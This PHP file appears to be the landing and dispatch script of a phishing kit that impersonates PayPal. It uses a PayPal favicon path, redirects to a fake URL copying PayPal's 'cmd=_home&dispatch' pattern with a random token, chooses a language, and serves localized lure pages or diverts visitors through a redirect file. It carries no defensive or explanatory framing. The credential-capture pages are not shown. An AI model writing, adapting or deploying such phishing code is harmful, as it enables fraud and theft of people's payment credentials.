<?php
if (!isset($_SESSION)) {
  session_start();
}
include "./option.php";
if($start==true){
$ee= md5(microtime());
function langue($l){
	switch($l){
	case "fr" : return "FR";break;
	case "en" : return "EN";break;
	case "es" : return "ES";break;
	default:return "EN";break;
	}}
if (isset($_GET['l'])){
ini_set('session.gc_maxlifetime', 60*7);
$_SESSION['tempLang']=$_GET['l'];
$_SESSION['old']="old";
}
if(!isset($_SESSION['tempLang']) or !isset($_GET['ee'])){
	ini_set('session.gc_maxlifetime', 3600);
	$lang = substr(strtolower($_SERVER["HTTP_ACCEPT_LANGUAGE"]), 0, 2);
	if ($lang != ''){$page = langue($lang);}
	$_SESSION['tempLang'] = $page;
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="fr"><head>
<meta http-equiv="X-UA-Compatible" content="IE=8">
<link rel="shortcut icon" href="WEBSCR-640-20101004-1/en_US/i/icon/pp_favicon_x.ico">
<META HTTP-EQUIV="refresh" content="0; URL=?cmd=_home&dispatch=5885d80a13c0db1f8e<?php echo "&ee=$ee"; ?>"></head></html>
<?php
}else{

if (isset($_SESSION['old']) or $old==true){
include "./lang/Paye.php";
include lang();
}else{
include "index-new.php";
}
}
}else{
include "./redi.php";
}
?>